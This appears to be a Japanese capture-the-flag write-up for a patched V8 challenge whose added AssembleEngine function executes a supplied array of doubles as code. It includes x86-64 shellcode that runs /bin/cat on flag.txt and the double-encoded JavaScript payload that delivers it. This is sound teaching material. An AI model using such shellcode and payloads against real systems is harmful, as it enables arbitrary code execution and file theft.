## tl;dr

V8 exploit, shellcode

## プログラム

Google の開発している JavaScript Engine, V8 に patch をあてたものを与えられます。

patch の内、重要そうな所だけ切り取ります。

```diff
+void Shell::AssembleEngine(const v8::FunctionCallbackInfo<v8::Value>& args) {
+  Isolate* isolate = args.GetIsolate();
+  if(args.Length() != 1) {
+    return;
+  }
+
+  double *func = (double *)mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  if (func == (double *)-1) {
+    printf("Unable to allocate memory. Contact admin\n");
+    return;
+  }
+
+  if (args[0]->IsArray()) {
+    Local<Array> arr = args[0].As<Array>();
+
+    Local<Value> element;
+    for (uint32_t i = 0; i < arr->Length(); i++) {
+      if (arr->Get(isolate->GetCurrentContext(), i).ToLocal(&element) && element->IsNumber()) {
+        Local<Number> val = element.As<Number>();
+        func[i] = val->Value();
+      }
+    }
+
+    printf("Memory Dump. Watch your endianness!!:\n");
+    for (uint32_t i = 0; i < arr->Length(); i++) {
+      printf("%d: float %f hex %lx\n", i, func[i], doubleToUint64_t(func[i]));
+    }
+
+    printf("Starting your engine!!\n");
+    void (*foo)() = (void(*)())func;
+    foo();
+  }
+  printf("Done\n");
+}
+
```

要はどういう事かと言うと、`AssembleEngine` の引数である double 型の配列を関数として実行するという事です。

## 解法

引数をそのまま実行しているので、shellcode を渡せば良さそうですが、引数は double になるのでバイナリを double に変換する必要があります。

これは、[変換してくれるサイト](https://silight.hatenablog.jp/entry/2016/08/23/212820) に投げる事ができます。

あとは shellcode を double に変換して投げるだけ... かのように思えますが、サーバーのプログラムを見ると shell を起動した後に入力を投げられないのでどうしようもありません。

そこで、仕方なく `execve("/bin/cat",["/bin/cat","flag.txt","NULL"],NULL)` を実行する shellcode を書く事にしました。

```asm
xor rax, rax;
xor rbx, rbx;
push rbx;
mov rbx, 0x7478742e67616c66;
push rbx;
push rsp;
pop rbx;
xor rcx, rcx;
push rcx;
mov rcx, 0x7461632f6e69622f;
push rcx;
push rsp;
pop rcx;
push rax;
push rbx;
push rcx;
push rsp;
pop rsi;
xor rbx, rbx;
push rbx;
mov rbx, 0x7461632f6e69622f;
push rbx;
push rsp;
pop rdi;
mov rax,0x3b;
cdq;
syscall;
```

コード長に余裕があるので無駄が多いのには目を瞑る事にしまして、これをバイナリに変換、double に変換した後の payload は以下となります。

```js
a=[2.7026887202725384e+40,1.7058643057456954e+272,9.788141225661296e+85,5.9310264137817665e+169,5.862568898663912e+83,-4.0246577527869836e-23,3.9836583598199556e+252,1.5438141401635297e-307,-6.827649529945208e-229];AssembleEngine(a);
```

これを投げると、見事に FLAG が出力されます。やったね！